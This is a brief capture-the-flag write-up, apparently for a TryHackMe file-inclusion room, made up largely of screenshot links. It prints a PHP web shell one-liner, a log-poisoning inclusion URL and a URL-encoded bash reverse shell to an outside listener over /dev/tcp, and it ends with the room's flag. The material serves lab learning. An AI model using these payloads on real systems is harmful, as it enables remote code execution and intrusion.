![Pasted image
20240209021724.png](https://github.com/sudo-awk/CTF/blob/main/THM/File_Inclusion-Path_Traversal/Pasted%20image%2020240209033647.png){.internal-embed
touched="true"}

### File Inclusion Types

![Pasted image
20240209021805.png](https://github.com/sudo-awk/CTF/blob/main/THM/File_Inclusion-Path_Traversal/Pasted%20image%2020240209021724.png){.internal-embed
touched="true"}

### PHP WRAPPER

    PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
    Copy

![Pasted image
20240209033546.png]([/home/aaron/Documents/thm/Pasted%20image%2020240209033546.png](https://github.com/sudo-awk/CTF/blob/main/THM/File_Inclusion-Path_Traversal/Pasted%20image%2020240209021758.png)){.internal-embed
touched="true"}

    Task 8 LFI2RCE - Wrappers

    I copied the `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` and submitted it to the server

    Copy

![Pasted image
20240209032424.png](/home/aaron/Documents/thm/Pasted%20image%2020240209032424.png){.internal-embed
touched="true"}

    and then I used this payload to get a reverse shell 

    page=/var/log/apache2/access.log&&cmd=/bin/bash -c '0<%26196%3Bexec 196<>%2Fdev%2Ftcp%2F10.6.29.207%2F9001%3B sh <%26196 >%26196 2>%26196'

    this is just a url encoded payload i crafted from revshells.com
    Copy

![Pasted image
20240209032701.png](/home/aaron/Documents/thm/Pasted%20image%2020240209032701.png){.internal-embed
touched="true"}

    THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc}
    Copy

    and finally the most important part is mitigation
    Copy

**![Pasted image
20240209033150.png](/home/aaron/Documents/thm/Pasted%20image%2020240209033150.png){.internal-embed
touched="true"}**
